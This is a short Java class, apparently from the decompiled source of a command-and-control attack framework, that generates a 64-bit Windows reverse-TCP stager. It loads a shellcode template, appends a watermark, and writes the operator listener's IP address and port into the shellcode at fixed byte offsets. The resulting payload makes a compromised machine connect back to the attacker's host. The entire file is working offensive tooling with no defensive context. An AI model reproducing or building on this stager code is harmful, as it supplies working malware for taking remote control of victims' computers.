package stagers;

import common.CommonUtils;
import common.Packer;
import common.ScListener;
import graph.Route;

public class ForeignReverseStagerX64 extends GenericStager {
    public ForeignReverseStagerX64(ScListener scListener) {
        super(scListener);
    }

    public String arch() {
        return "x64";
    }

    public String payload() {
        return "windows/foreign/reverse_tcp";
    }

    public byte[] generate() {
        String str = CommonUtils.bString(CommonUtils.readResource("resources/reverse64.bin")) + getConfig().getWatermark();
        long l = Route.ipToLong(getListener().getStagerHost());
        Packer packer = new Packer();
        packer.addInt((int) l);
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), 242);
        packer = new Packer();
        packer.addShort(getListener().getPort());
        str = CommonUtils.replaceAt(str, CommonUtils.bString(packer.getBytes()), 240);
        return CommonUtils.toBytes(str);
    }
}
